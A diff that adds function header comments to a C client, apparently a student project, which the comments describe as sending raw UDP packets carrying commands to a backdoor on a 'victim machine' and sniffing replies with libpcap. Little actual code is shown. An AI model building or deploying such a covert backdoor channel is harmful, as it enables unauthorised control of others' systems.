@@ -1,5 +1,25 @@
 #include "client.h"
 
+/*--------------------------------------------------------------------------------------------------------------
+--	FUNCTION:	    send_packet
+--
+--	INTERFACE:	    void send_packet(struct AddrInfo *UserAddr)
+--
+--				    AddrInfo *UserAddr - a AdderInfo struct contain the source port and IP, destination port and
+--                      IP, command to execute.
+--
+--	RETURNS:
+--
+--	LAST MODIFIED:  October 6, 2014
+--
+--	DESIGNERS:	    Slade Solobay & Zach Smoroden
+--
+--	PROGRAMMERS:	Slade Solobay & Zach Smoroden
+--
+--	NOTES:
+--	Sends a raw UDP packet towards a backdoor. Contain a command to execute on the victim machine.
+--
+--------------------------------------------------------------------------------------------------------------*/
 void send_packet(struct AddrInfo *UserAddr)
 {
     char datagram[PKT_SIZE], *data; 	// set the Datagram (packet) size
@@ -69,6 +89,27 @@ void send_packet(struct AddrInfo *UserAddr)
     }
 }
 
+/*--------------------------------------------------------------------------------------------------------------
+--	FUNCTION:	    receive_packet
+--
+--	INTERFACE:	    void receive_packet(PcapInfo *pcap_arg)
+--
+--				    PcapInfo *pcap_arg - a PcapInfo struct contain the descriptor to the active NIC,
+--                      address/subnet mask and packet Filter string to be compiled into the NIC
+--
+--	RETURNS:
+--
+--	LAST MODIFIED:  October 6, 2014
+--
+--	DESIGNERS:	    Slade Solobay & Zach Smoroden
+--
+--	PROGRAMMERS:	Slade Solobay & Zach Smoroden
+--
+--	NOTES:
+--	Listens for packets using the libpcap library. Captures packets based on FILTER in client.h. Calls
+--  pkt_callback for each packet captured.
+--
+--------------------------------------------------------------------------------------------------------------*/
 void receive_packet(PcapInfo *pcap_arg)
 {
     struct bpf_program fp;      // holds the compiled program
@@ -93,7 +134,28 @@ void receive_packet(PcapInfo *pcap_arg)
 
 }
 
-
+/*--------------------------------------------------------------------------------------------------------------
+--	FUNCTION:	    pkt_callback
+--
+--	INTERFACE:	    void pkt_callback (u_char *descr, const struct pcap_pkthdr* pkthdr, const u_char* packet)
+--
+--				    u_char *descr - the nic descriptor used for breaking the pcap_loop
+--                  const struct pcap_pkthdr* pkthdr - struct pcap_pkthdr pointer pointing to the packet time stamp
+--                    and lengths
+--                  const u_char* packet - pointer to the first caplen (as given in the struct pcap_pkthdr a pointer,
+--                    which is passed to the callback routine) bytes of data from the packet.
+--	RETURNS:
+--
+--	LAST MODIFIED:  October 6, 2014
+--
+--	DESIGNERS:	    Slade Solobay & Zach Smoroden
+--
+--	PROGRAMMERS:	Slade Solobay & Zach Smoroden
+--
+--	NOTES:
+--	Callback function for pcap_loop. Prints data of first packet received and breaks.
+--
+--------------------------------------------------------------------------------------------------------------*/
 void pkt_callback (u_char *descr, const struct pcap_pkthdr* pkthdr, const u_char* packet)
 {
 	static int count = 1;
